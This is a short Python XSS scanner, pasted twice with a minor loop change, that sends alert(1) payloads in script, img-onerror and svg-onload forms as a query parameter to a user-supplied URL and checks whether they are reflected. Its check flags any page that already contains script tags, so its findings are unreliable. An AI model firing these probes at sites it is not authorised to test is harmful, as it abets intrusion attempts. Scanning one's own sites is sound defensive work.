import requests

def check_xss(url):
  payloads = ['<script>alert(1)</script>', '"><script>alert(1)</script>',
              '<img src=x onerror=alert(1)>', '"><img src=x onerror=alert(1)>',
              '<svg/onload=alert(1)>', '"><svg/onload=alert(1)>']
  for payload in payloads:
    r = requests.get(url, params={'q': payload})
    if payload in r.text:
      return (True, payload)

    # Check for other indicators of XSS vulnerability
    if '<script>' in r.text.lower() or 'javascript:' in r.text.lower():
      return (True, '<script> or javascript:')

  return (False, '')

if __name__ == '__main__':
  url = input('Enter the URL to check: ')
  result = check_xss(url)
  if result[0]:
    print('XSS vulnerability found! Payload:', result[1])
  else:
    print('No XSS vulnerability found.')
import requests

def check_xss(url):
  payloads = ['<script>alert(1)</script>', '"><script>alert(1)</script>',
              '<img src=x onerror=alert(1)>', '"><img src=x onerror=alert(1)>',
              '<svg/onload=alert(1)>', '"><svg/onload=alert(1)>']
  for payload in payloads:
    r = requests.get(url, params={'q': payload})
    if payload in r.text:
      return (True, payload)

    # Check for other indicators of XSS vulnerability
    if '<script>' in r.text.lower() or 'javascript:' in r.text.lower():
      return (True, '<script> or javascript:')

  return (False, '')

if __name__ == '__main__':
  while True:
    url = input('Enter the URL to check (or enter "q" to quit): ')
    if url == 'q':
      break
    result = check_xss(url)
    if result[0]:
      print('XSS vulnerability found! Payload:', result[1])
    else:
      print('No XSS vulnerability found.')
